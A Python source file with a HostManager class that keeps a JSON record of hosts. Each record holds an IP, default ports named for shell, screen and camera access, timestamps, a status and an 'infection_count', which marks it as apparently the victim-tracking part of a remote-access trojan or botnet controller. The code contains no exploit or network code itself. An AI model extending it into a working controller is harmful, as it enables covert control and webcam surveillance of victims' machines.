import json
import os
from datetime import datetime

class HostManager:
    def __init__(self, filename="connected_hosts.json"):
        self.filename = filename
        self.hosts = self.load_hosts()

    def load_hosts(self):
        if os.path.exists(self.filename):
            try:
                with open(self.filename, 'r') as f:
                    return json.load(f)
            except:
                return {}
        return {}

    def add_host(self, ip, ports=None):
        """Add or update a host with additional information"""
        if ports is None:
            ports = {
                'shell': 5000,
                'screen': 5001,
                'camera': 5002
            }

        self.hosts[ip] = {
            'ip': ip,
            'ports': ports,
            'first_seen': self.hosts.get(ip, {}).get('first_seen', datetime.now().isoformat()),
            'last_seen': datetime.now().isoformat(),
            'status': 'Reachable',
            'infection_count': self.hosts.get(ip, {}).get('infection_count', 0) + 1
        }
        self.save_hosts()

    def update_host_status(self, ip, status):
        """Update host status and last seen time"""
        if ip in self.hosts:
            self.hosts[ip]['status'] = status
            self.hosts[ip]['last_seen'] = datetime.now().isoformat()
            self.save_hosts()

    def remove_host(self, ip):
        """Remove a host from tracking"""
        if ip in self.hosts:
            del self.hosts[ip]
            self.save_hosts()

    def get_hosts(self):
        """Get list of all host IPs"""
        return list(self.hosts.keys())

    def get_host_info(self, ip):
        """Get detailed information about a specific host"""
        return self.hosts.get(ip, None)

    def get_active_hosts(self):
        """Get list of currently active hosts"""
        return [ip for ip, info in self.hosts.items() if info['status'] == 'Reachable']

    def save_hosts(self):
        """Save hosts data to file"""
        with open(self.filename, 'w') as f:
            json.dump(self.hosts, f, indent=4) 